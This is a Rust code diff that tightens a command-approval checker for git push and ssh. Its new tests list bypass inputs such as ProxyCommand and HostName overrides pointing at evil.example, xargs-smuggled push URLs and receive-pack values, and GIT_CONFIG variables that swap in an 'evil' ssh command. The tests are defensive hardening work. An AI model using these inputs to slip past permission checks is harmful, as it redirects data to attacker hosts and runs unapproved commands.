@@ -322,6 +322,11 @@ fn sticky_keys(command: &str, ctx: &risk::Ctx, root: &Path, unsandboxed: bool) -
             return None;
         }
         if network(&c.words).is_some() {
+            // Wrapped (`xargs` adds stdin's words, `VAR=` changes git's config) or run inside
+            // another command: no key (review a2, H2 and M3).
+            if c.wrapped || c.nested || !c.env.is_empty() {
+                return None;
+            }
             keys.push(sticky_key(&c.words)?);
         }
     }
@@ -365,8 +370,12 @@ fn sticky_key(words: &[String]) -> Option<String> {
         "ssh" => (&["-4", "-6", "-C", "-n", "-N", "-q", "-t", "-T", "-v", "-x"], 0),
         _ => return None,
     };
+    // A path to the program (`./git`) is something else.
+    if words[0].contains(['/', '\\']) {
+        return None;
+    }
     let mut target = None;
-    for a in &args[first..] {
+    for (i, a) in args.iter().enumerate().skip(first) {
         if a.starts_with('-') {
             // Before the remote or host (ssh's later words are the remote command).
             if target.is_none() && !flags.contains(&a.as_str()) {
@@ -374,7 +383,11 @@ fn sticky_key(words: &[String]) -> Option<String> {
             }
         } else if target.is_none() {
             target = Some(a.as_str());
+            // ssh reads options after the host too (`ssh h -o ProxyCommand=…`, review a2 H1).
             if name == "ssh" {
+                if args.get(i + 1).is_some_and(|n| n.starts_with('-')) {
+                    return None;
+                }
                 break;
             }
         }
@@ -951,6 +964,17 @@ mod tests {
             "ssh -o ProxyCommand=x novahome",
             "ssh -l root host",
             "ssh -J jump novahome",
+            "ssh novahome -o HostName=evil.example",
+            "ssh novahome -oProxyCommand=evilcmd",
+            "ssh novahome -l root",
+            "echo https://evil.example/r.git | xargs git push",
+            "printf '%s\\n' --receive-pack=evil . | xargs git push origin",
+            "echo -oHostName=evil | xargs ssh novahome",
+            "timeout 5 git push origin",
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0=evil git push origin",
+            "env GIT_CONFIG_PARAMETERS=x git push origin",
+            "HOME=/tmp/h git push origin",
+            "./git push origin",
             "git push && python3 -c 'print(1)'",
             "git push > ~/out",
         ] {
